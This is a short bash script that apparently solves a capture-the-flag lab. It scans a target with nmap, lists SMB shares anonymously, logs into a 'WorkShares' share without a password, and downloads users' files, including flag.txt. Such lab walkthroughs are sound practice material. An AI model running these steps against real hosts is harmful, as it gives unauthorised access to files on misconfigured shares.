#!/usr/bin/env bash
# Usage: ./enum-smb.sh <TARGET_IP>

TARGET=$1

echo "[*] Running Nmap scan..."
nmap -sV $TARGET -oN nmap.txt

echo "[*] Enumerating SMB shares..."
smbclient -L //$TARGET -N -g | tee smb-list.txt

echo "[*] Connecting to WorkShares and pulling files..."
smbclient //$TARGET/WorkShares -N << 'EOF'
cd Amy.J
get worknotes.txt
cd ../James.P
get flag.txt
exit
EOF

echo "[*] Retrieved flag:"
cat flag.txt
